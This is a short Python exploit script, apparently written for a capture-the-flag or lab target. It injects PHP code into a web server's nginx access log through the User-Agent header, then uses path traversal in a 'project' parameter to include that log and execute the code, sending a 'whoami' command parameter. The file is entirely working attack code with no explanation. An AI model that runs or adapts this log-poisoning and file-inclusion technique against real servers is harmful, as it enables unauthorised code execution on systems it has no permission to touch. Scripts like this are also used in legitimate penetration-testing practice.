from requests import get

IP = '94.237.59.174'
PORT = '58212'

# Test payload for PHP execution
payload = 'phpinfo()'
php_payload = f"<?php {payload}; ?>"

headers = {
    'User-Agent': php_payload
}

get(f'http://{IP}:{PORT}/', headers=headers)
r = get(f'http://{IP}:{PORT}/our-projects.php?project=../../../../var/log/nginx/access.log', params={'cmd': 'whoami'})

print(r.text)
